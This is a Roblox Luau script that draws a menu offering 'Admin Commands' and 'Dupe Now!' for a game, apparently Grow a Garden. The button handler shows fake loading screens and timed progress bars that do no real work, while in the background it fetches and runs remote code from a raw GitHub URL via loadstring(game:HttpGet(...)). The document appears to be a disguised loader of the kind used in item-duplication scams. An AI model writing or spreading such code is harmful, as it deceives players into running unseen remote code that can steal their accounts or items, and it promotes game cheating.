--// Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// GUI Initialization
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "CustomGui"
mainGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", mainGui)
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 0.05
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local layout = Instance.new("UIListLayout", mainFrame)
layout.Padding = UDim.new(0, 10)
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

--// Create Hoverable Button
local function createButton(name)
	local btn = Instance.new("TextButton", mainFrame)
	btn.Size = UDim2.new(0.8, 0, 0, 40)
	btn.Text = name
	btn.Font = Enum.Font.Cartoon
	btn.TextSize = 22
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	btn.AutoButtonColor = false
	local corner = Instance.new("UICorner", btn)
	corner.CornerRadius = UDim.new(0, 10)

	-- Hover effect
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 80, 80)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
	end)

	return btn
end

--// Loading Screen
local function createLoadingScreen(message)
	local screen = Instance.new("ScreenGui", playerGui)
	screen.Name = "FullLoadingScreen"
	screen.IgnoreGuiInset = true

	local bg = Instance.new("Frame", screen)
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

	local label = Instance.new("TextLabel", bg)
	label.Size = UDim2.new(1, 0, 0, 60)
	label.Position = UDim2.new(0.5, 0, 0.4, 0)
	label.AnchorPoint = Vector2.new(0.5, 0.5)
	label.Text = message
	label.Font = Enum.Font.Cartoon
	label.TextSize = 32
	label.TextColor3 = Color3.new(1, 1, 1)
	label.BackgroundTransparency = 1

	local percent = Instance.new("TextLabel", bg)
	percent.Size = UDim2.new(0, 200, 0, 30)
	percent.Position = UDim2.new(0.5, 0, 0.5, 0)
	percent.AnchorPoint = Vector2.new(0.5, 0.5)
	percent.Font = Enum.Font.Cartoon
	percent.TextSize = 26
	percent.TextColor3 = Color3.new(1, 1, 1)
	percent.BackgroundTransparency = 1
	percent.Text = "0%"

	local progressBar = Instance.new("Frame", bg)
	progressBar.Size = UDim2.new(0, 0, 0, 8)
	progressBar.Position = UDim2.new(0.5, -100, 0.6, 0)
	progressBar.BackgroundColor3 = Color3.new(1, 1, 1)
	Instance.new("UICorner", progressBar).CornerRadius = UDim.new(1, 0)

	local totalTime = 2
	local steps = 100
	local delay = totalTime / steps

	task.spawn(function()
		for i = 1, steps do
			percent.Text = i .. "%"
			progressBar.Size = UDim2.new(i / 100, 0, 0, 8)
			wait(delay)
		end
		TweenService:Create(bg, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
		TweenService:Create(label, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
		TweenService:Create(percent, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
		TweenService:Create(progressBar, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
		wait(0.6)
		screen:Destroy()
	end)

	return screen
end

--// Script Loading UI
local function showPleaseWait()
	local waitGui = Instance.new("ScreenGui", playerGui)
	waitGui.Name = "PleaseWaitUI"

	local label = Instance.new("TextLabel", waitGui)
	label.Size = UDim2.new(0, 400, 0, 80)
	label.Position = UDim2.new(0.5, -200, 0.5, -40)
	label.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	label.TextColor3 = Color3.new(1, 1, 1)
	label.TextSize = 30
	label.Text = "Loading Script, Please wait..."
	label.Font = Enum.Font.Cartoon
	Instance.new("UICorner", label).CornerRadius = UDim.new(0, 12)

	-- Animate loading text
	local run = true
	task.spawn(function()
		while run do
			for i = 0, 3 do
				if not run then return end
				label.Text = "Loading Script, Please wait" .. string.rep(".", i)
				wait(0.5)
			end
		end
	end)

	wait(10)
	run = false
	waitGui:Destroy()
end

--// On Button Click
local function handleClick(button, type)
	mainGui.Enabled = false

	local msg = (type == "dupe") and "Finding a Low Server In order Dupe to Work."
		or "Finding a Low Server In order Admin Commands Work."

	createLoadingScreen(msg) -- loading starts immediately

	-- Run script & "Please wait..." simultaneously
	task.spawn(showPleaseWait)

	task.spawn(function()
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
		end)
	end)
end

--// Create Buttons
local adminBtn = createButton("Admin Commands")
adminBtn.MouseButton1Click:Connect(function()
	handleClick(adminBtn, "admin")
end)

local dupeBtn = createButton("Dupe Now!")
dupeBtn.MouseButton1Click:Connect(function()
	handleClick(dupeBtn, "dupe")
end)
